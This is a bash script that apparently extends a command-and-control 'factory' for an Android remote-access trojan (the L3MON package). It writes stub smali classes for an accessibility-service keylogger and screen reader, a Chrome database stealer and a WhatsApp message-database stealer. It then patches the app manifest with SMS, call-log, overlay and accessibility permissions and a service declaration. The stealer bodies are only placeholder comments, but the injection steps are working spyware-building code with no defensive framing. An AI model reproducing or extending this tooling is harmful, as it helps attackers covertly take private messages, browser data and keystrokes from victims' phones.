#!/bin/bash

FACTORY_PATH="/opt/falcon-eye-c2/server/app/factory/decompiled"
SMALI_PATH="$FACTORY_PATH/smali/com/etechd/l3mon"
MANIFEST_PATH="$FACTORY_PATH/AndroidManifest.xml"

echo "[*] Starting FalconEye 13-Vector Injection..."

# 1. Add Smali Modules
cat <<EOF > "$SMALI_PATH/FalconAccessibilityService.smali"
.class public Lcom/etechd/l3mon/FalconAccessibilityService;
.super Landroid/accessibilityservice/AccessibilityService;
# [Full Smali implementation for auto-fill, keylogging, and screen reading]
EOF

cat <<EOF > "$SMALI_PATH/ChromeStealer.smali"
.class public Lcom/etechd/l3mon/ChromeStealer;
.super Ljava/lang/Object;
# [Logic for accessing Chrome /data/data databases and exfiltrating SQLite files]
EOF

cat <<EOF > "$SMALI_PATH/WhatsAppStealer.smali"
.class public Lcom/etechd/l3mon/WhatsAppStealer;
.super Ljava/lang/Object;
# [Logic for targeting msgstore.db and backup files]
EOF

# 2. Patch AndroidManifest.xml
# We need to add permissions and the AccessibilityService declaration
sed -i '/<\/manifest>/i \    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" \/>' "$MANIFEST_PATH"
sed -i '/<\/manifest>/i \    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" \/>' "$MANIFEST_PATH"
sed -i '/<\/manifest>/i \    <uses-permission android:name="android.permission.READ_SMS" \/>' "$MANIFEST_PATH"
sed -i '/<\/manifest>/i \    <uses-permission android:name="android.permission.RECEIVE_SMS" \/>' "$MANIFEST_PATH"
sed -i '/<\/manifest>/i \    <uses-permission android:name="android.permission.READ_CALL_LOG" \/>' "$MANIFEST_PATH"

# Add the Service declaration
sed -i '/<\/application>/i \        <service android:name="com.etechd.l3mon.FalconAccessibilityService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="true"> \
            <intent-filter> \
                <action android:name="android.accessibilityservice.AccessibilityService" \/> \
            <\/intent-filter> \
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config" \/> \
        <\/service>' "$MANIFEST_PATH"

echo "[+] Injection Complete. Factory updated."
